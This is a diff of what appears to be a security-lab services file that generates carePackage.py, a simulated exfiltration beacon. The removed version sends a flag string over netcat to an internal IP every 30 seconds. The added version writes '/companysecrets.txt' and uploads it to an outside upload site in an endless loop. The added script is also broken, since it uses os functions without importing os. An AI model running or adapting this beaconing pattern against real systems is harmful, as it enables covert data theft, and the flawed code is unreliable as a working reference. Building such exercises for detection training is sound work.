@@ -277,28 +277,76 @@ services:
         ## create carePackage.py
         cat > "/carePackage.py" << 'EOF'
         #!/usr/bin/env python3
-        import subprocess
         import time
+        from urllib.request import Request, urlopen
+        import mimetypes
 
-        # Define the remote IP address, port, and payload
-        REMOTE_IP = '192.168.100.20'  # Replace with the actual IP address (current IP maps to httpbin.org
-        PORT = 443
-        PAYLOAD = "Q1RGLUhheDByIQ=="
+        # Define the directory, file name, and remote URL
+        directory = '/'
+        file_name = 'companysecrets.txt'
+        remote_url = 'https://practice.expandtesting.com/upload'  # External website that allows uploads
 
-        # Function to establish a network connection using nc (netcat)
-        def establish_network_connection(ip, port, payload):
+        def create_file(directory, file_name):
+            full_path = os.path.join(directory, file_name)
+            
             try:
-                # Use netcat to connect to the remote IP and port, and send the payload
-                subprocess.run(['echo', payload] + ['|'] + ['nc', ip, str(port)], shell=True, check=True)
-                print(f"Payload sent successfully to {ip}:{port}")
-            except subprocess.CalledProcessError as e:
-                print(f"Failed to send payload to {ip}:{port}. Error: {e}")
+                if not os.path.exists(directory):
+                    os.makedirs(directory)
+                
+                with open(full_path, 'w') as file:
+                    file.write("Q1RGLUhheDByIQ==")
+                
+                print(f"File '{file_name}' created successfully at {full_path}")
+            
+            except Exception as e:
+                print(f"An error occurred while creating the file: {e}")
 
-        # Main function to establish connection and loop every 10 minutes
+        def post_file(remote_url, full_path):
+            try:
+                if not os.path.exists(full_path):
+                    raise FileNotFoundError(f"The file {full_path} does not exist.")
+                
+                with open(full_path, 'rb') as file:
+                    content = file.read()
+                    
+                    # Get the MIME type of the file
+                    content_type, _ = mimetypes.guess_type(full_path)
+                    if content_type is None:
+                        content_type = 'application/octet-stream'
+                    
+                    headers = {
+                        'Content-Type': f'{content_type}',
+                        'Content-Disposition': f'attachment; filename="{file_name}"'
+                    }
+                
+                request = Request(
+                    url=remote_url,
+                    data=content,
+                    headers=headers
+                )
+                
+                with urlopen(request) as response:
+                    if response.status == 200:
+                        print("File posted successfully!")
+                    else:
+                        print(f"Failed to post file. Status code: {response.status}")
+            
+            except Exception as e:
+                print(f"An error occurred while posting the file: {e}")
+
         def main():
-            while True:
-                establish_network_connection(REMOTE_IP, PORT, PAYLOAD)
-                time.sleep(30)  # Sleep for 30 seconds
+            full_path = os.path.join(directory, file_name)
+            
+            try:
+                create_file(directory, file_name)
+                
+                # Loop every 30 seconds
+                while True:
+                    post_file(remote_url, full_path)
+                    time.sleep(30)  # Sleep for 30 seconds
+
+            except Exception as e:
+                print(f"An unexpected error occurred: {e}")
 
         if __name__ == "__main__":
             main()
